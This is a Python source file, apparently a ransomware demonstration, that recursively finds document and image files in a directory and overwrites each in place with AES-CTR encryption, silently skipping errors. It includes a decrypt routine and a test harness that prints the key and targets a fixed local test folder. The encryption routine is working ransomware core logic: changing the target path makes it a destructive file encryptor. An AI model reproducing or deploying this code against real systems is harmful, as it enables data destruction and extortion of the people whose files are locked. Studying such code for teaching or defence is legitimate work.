import os
import time
from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
from pathlib import Path 

#filter extensions
DOCUMENT_EXTENSIONS = {
    ".txt", ".pdf", ".doc", ".docx",
    ".xls", ".xlsx", ".ppt", ".pptx"
}

IMAGE_EXTENSIONS = {
    ".jpg", ".jpeg", ".png", ".gif",
    ".bmp", ".webp"
}

def iter_allowed_files(base_dir):
    base_dir = Path(base_dir)

    for root, _, files in os.walk(base_dir):
        for name in files:
            path = Path(root) / name
            ext = path.suffix.lower()

            # Windows system file
            if name.lower() == "desktop.ini":
                continue

            # Skip non-writable files
            if not os.access(path, os.W_OK):
                continue

            if ext in DOCUMENT_EXTENSIONS or ext in IMAGE_EXTENSIONS:
                yield path

def encrypt_file(file_path, key):
    #ensure parameter contain path
    if not os.path.isfile(file_path):
        return

    nonce = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as f:
        plaintext = f.read()

    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    with open(file_path, 'wb') as f:
        f.write(nonce + ciphertext)


def decrypt_file(file_path, key):
    if not os.path.isfile(file_path):
        return

    with open(file_path, 'rb') as f:
        data = f.read()

    nonce = data[:16]
    ciphertext = data[16:]

    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
    decryptor = cipher.decryptor()

    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    with open(file_path, 'wb') as f:
        f.write(plaintext)


#directory level
def encrypt_directory(target_dir, key):
    for file_path in iter_allowed_files(target_dir):
        try:
            encrypt_file(file_path, key)
        except Exception:
            continue

def decrypt_directory(target_dir, key):
    for file_path in iter_allowed_files(target_dir):
        try:
            decrypt_file(file_path, key)  
        except Exception:
            continue


#for testing purpose only
if __name__ == "__main__":
    key = os.urandom(32) 

    print(f'Generated Key: {key.hex()}')
    time.sleep(2)

    
    dir_to_encrypt = '/home/k4k/vscode/safe-ransomware-crypto-demo/src/testing_env/'
    encrypt_directory(dir_to_encrypt, key)
    print(f'Files in directory: {dir_to_encrypt} encrypted.')

    for _ in range(5):
        print(f'Decrypting files in {5 - _} seconds...')
        time.sleep(1)

    key_input = input('Enter the decryption key (hex format): ')
    Vkey = bytes.fromhex(key_input.strip())

    decrypt_directory(dir_to_encrypt, Vkey)
    print(f'Files in directory: {dir_to_encrypt} decrypted.')

